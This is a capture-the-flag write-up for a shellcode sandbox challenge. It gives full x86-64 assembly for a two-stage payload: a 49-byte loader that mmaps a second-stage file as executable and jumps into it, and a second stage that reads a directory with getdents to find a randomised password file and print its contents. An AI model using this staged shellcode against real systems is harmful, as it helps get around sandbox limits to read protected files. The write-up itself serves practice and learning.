**Challenge Overview**

In this challenge, the user is prompted by the program to enter shellcode that
the program will then execute. Two major obstacles must be overcome in order
to do this. The first obstacle is the limited subset of syscalls that are
permitted (and hence, this challenge is a sandbox challenge). The second is the
size limitation on the size of the shellcode that can be input.

We need to gain access to the flag in the password file; however, everytime the
vulnerable program is run, the name of the password file is changed to a random
string of characters (and the file is within a directory, the contents of which
we cannot view). This necessitates creating shellcode that is not as simple as
simply opening a known filename and printing the contents to standard output.
We must open the directory and then read the filename from its directory entry.
Thankfully, this is at least simplified by the fact this is the only file within
the directory.

All of this means the shellcode necessary to complete the challenge is a lot
longer than the limit, which is 50 bytes.

We can read the contents of the shell script that is automatically run when
we start the vulnerable program:

```
#!/bin/sh

PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
CHALLENGE_PATH="$(dirname ${0})"

cd $CHALLENGE_PATH

UUID=$(tr -dc A-Za-z0-9 < /dev/urandom | head -c 32)

chmod 700 passwd/
mv passwd/.passwd_* "passwd/.passwd_${UUID}"
chmod 400 passwd/.passwd_*
chmod 500 passwd/

timeout -k 2m 1m ./p-sandbox ./ch10
```

We are only permitted to use the following system calls:

`read, write, exit, brk, mmap, access, open, fstat, close, mprotect,
munmap, arch_prctl, exit_group, getdents`

In order to complete the challenge, we must divide our shellcode into
two phases. The second phase of our shellcode will be kept in a file
that we put into some private directory we create in /tmp. That leaves
the first phase, which becomes as simply as creating a memory mapped
region into which the contents of our known file will be read. We then
change the permissions of this memory mapped region to be executable
and then use a JMP instruction to jump to the start of this region, thus
executing the second phase of our shellcode. Therefore, we have bypassed
the restriction of 50 bytes and our shellcode can be as long as we wish.

All of this uses only the restricted subset of system calls in the sandbox.

**Phase one of our exploit**

  - _Open file with phase two_
  - _Map the contents into memory, with the permission set
    (PROT_READ|PROT_WRITE|PROT_EXEC)_
  - _Pass execution to it_

The total size of this part of the exploit is 49 bytes, thus within the
size limitation of the sandbox.

**Phase two of our exploit**

  - _Open the "passwd" directory (pass O_DIRECTORY flag to open())_
  - _Read the directory entries onto the stack using sys_dirents_
  - _Push "passwd/" onto the stack and then append the obtained filename to it_
  - _Open the password file_
  - _Read contents onto stack_
  - _Print contents to stdout_

The size of this part of the exploit is 161 bytes, itself well over the size
limitation. The total size of the exploit is therefore 210 bytes.


**Assembly code for part I of the exploit**

```
.section .rodata

.equ SYS_MMAP,9
.equ PROT,0x7
.equ FLAGS,0x2

.globl _start

_start:
	mov $0x63732f706d742f,%rdi
	push %rdi
	mov %rsp,%rdi
	push $2
	pop %rsi
	push $2
	pop %rax
	syscall
	mov %rax,%r8
	xor %rdi,%rdi
	movb $131,%sil
	push $0
	pop %r9
	push $PROT
	pop %rdx
	push $FLAGS
	pop %r10
	push $SYS_MMAP
	pop %rax
	syscall
	call *%rax
```
  
**Assembly code for part II of the exploit**

```
.section .rodata

.equ SYS_READ,0
.equ SYS_WRITE,1
.equ SYS_OPEN,2
.equ SYS_EXIT,60
.equ SYS_GETDENTS,78
.equ O_DIRECTORY,0200000
.equ OFLAGS,0x242

.globl _start

_start:
	mov $0x647773736170,%rdi
	push %rdi
	mov %rsp,%rdi
	push $O_DIRECTORY
	pop %rsi
	push $SYS_OPEN
	pop %rax
	syscall
	mov %rax,%rdi
	mov %rsp,%rsi
	mov $255,%dl
	push $SYS_GETDENTS
	pop %rax
	syscall

	add $42,%rsp
	mov %rsp,%rsi
	sub $0x200,%rsp
	push $42
	pop %rcx
	mov $0x2f647773736170,%rdi
	push %rdi
	add $7,%rsp
	mov %rsp,%rdi
.mloop:
	movb (%rsi),%al
	movb %al,(%rdi)
	inc %rsi
	inc %rdi
	dec %rcx
	jne .mloop

	mov $0,%rax
	movb %al,(%rdi)

	mov $1,%rsi
	dec %rsi
	mov $2,%rax
	sub $7,%rsp
	mov %rsp,%rdi
	syscall
	mov %rax,%rdi
	sub $0x100,%rsp
	mov %rsp,%rsi
	push $64
	pop %rdx
	push $SYS_READ
	pop %rax
	syscall

	push $1
	pop %rdi
	push $0x800
	pop %rdx
	mov %rsp,%rsi
	push $SYS_WRITE
	pop %rax
	syscall
```
